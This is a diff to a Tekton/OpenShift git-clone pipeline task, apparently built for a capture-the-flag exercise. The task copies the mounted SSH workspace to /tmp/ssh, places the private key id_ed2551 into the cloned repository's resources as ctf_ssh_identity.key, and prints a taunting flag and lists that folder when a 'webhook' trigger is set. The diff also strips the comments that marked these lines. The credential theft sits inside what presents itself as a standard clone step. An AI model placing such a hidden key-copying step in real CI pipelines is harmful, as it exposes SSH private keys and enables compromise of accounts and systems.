@@ -71,6 +71,9 @@ spec:
       description: Log the commands that are executed during `git-clone`'s operation.
       name: verbose
       type: string
+    - default: ''
+      name: trigger
+      type: string      
     - default: 'registry.redhat.io/openshift-pipelines/pipelines-git-init-rhel8@sha256:043080bff45cd129c0852b55a578c1a85e8911de80fadef22a21a034a1eccd56'
       description: The image providing the git-init binary that this Task runs.
       name: gitInitImage
@@ -120,6 +123,8 @@ spec:
           value: $(params.noProxy)
         - name: PARAM_VERBOSE
           value: $(params.verbose)
+        - name: TRIGGER
+          value: $(params.trigger)          
         - name: PARAM_SPARSE_CHECKOUT_DIRECTORIES
           value: $(params.sparseCheckoutDirectories)
         - name: PARAM_USER_HOME
@@ -157,10 +162,7 @@ spec:
         fi
 
         if [ "${WORKSPACE_SSH_DIRECTORY_BOUND}" = "true" ] ; then      
-
-          # CTF ---
           mkdir -p /tmp/ssh && cp ${WORKSPACE_SSH_DIRECTORY_PATH}/* /tmp/ssh
-          # ---- 
           
           cp -R "${WORKSPACE_SSH_DIRECTORY_PATH}" "${PARAM_USER_HOME}"/.ssh
           chmod 700 "${PARAM_USER_HOME}"/.ssh
@@ -210,26 +212,18 @@ spec:
           -depth="${PARAM_DEPTH}" \
           -sparseCheckoutDirectories="${PARAM_SPARSE_CHECKOUT_DIRECTORIES}"
         cd "${CHECKOUT_DIR}"
-        
-        # CTF ---
         cp -R /tmp/ssh/id_ed2551 ${WORKSPACE_OUTPUT_PATH}/src/main/resources/ctf_ssh_identity.key
-        # ---- 
         
         RESULT_SHA="$(git rev-parse HEAD)"
         EXIT_CODE="$?"
         if [ "${EXIT_CODE}" != 0 ] ; then
           exit "${EXIT_CODE}"
         fi
+        [ "$TRIGGER" = "webhook" ] && echo "CTF{AHAHAHAHAHA... Thanks for running the pipeline again....Now I have the SSH KEY I WAS LOOKING FOR !!!! }" && ls -R ${WORKSPACE_OUTPUT_PATH}/src/main/resources
         RESULT_COMMITTER_DATE="$(git log -1 --pretty=%ct)"
         printf "%s" "${RESULT_COMMITTER_DATE}" > "$(results.committer-date.path)"
         printf "%s" "${RESULT_SHA}" > "$(results.commit.path)"
-        printf "%s" "${PARAM_URL}" > "$(results.url.path)"
-
-        echo ""
-        echo ""
-        echo "CTF{AHAHAHAHAHA... Thanks for running the pipeline again....Now I have the SSH KEY I WAS LOOKING FOR !!!! }"
-        ls -R ${WORKSPACE_OUTPUT_PATH}/src/main/resources
-        	
+        printf "%s" "${PARAM_URL}" > "$(results.url.path)"      	
       securityContext:
         runAsNonRoot: true
         runAsUser: 65532
